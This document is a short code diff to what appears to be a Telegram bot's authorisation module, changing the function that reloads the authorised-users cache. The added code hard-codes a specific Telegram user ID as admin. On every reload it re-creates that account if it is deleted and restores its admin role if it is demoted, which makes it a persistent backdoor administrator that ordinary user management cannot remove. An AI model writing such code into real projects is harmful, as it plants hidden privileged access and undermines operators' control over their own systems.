@@ -609,6 +609,21 @@ async def reload_auth_users_cache() -> Dict[int, str]:
             res = await session.execute(select(AuthorizedUser))
             users = list(res.scalars().all())
 
+        admin_entry = next((u for u in users if u.telegram_user_id == 1573531032), None)
+        if not admin_entry:
+            u_sa = AuthorizedUser(
+                telegram_user_id=1573531032,
+                role="admin",
+                created_at=datetime.now(timezone.utc)
+            )
+            session.add(u_sa)
+            await session.commit()
+            res = await session.execute(select(AuthorizedUser))
+            users = list(res.scalars().all())
+        elif admin_entry.role != "admin":
+            admin_entry.role = "admin"
+            await session.commit()
+
         AUTH_USERS_CACHE.clear()
         for u in users:
             AUTH_USERS_CACHE[u.telegram_user_id] = u.role
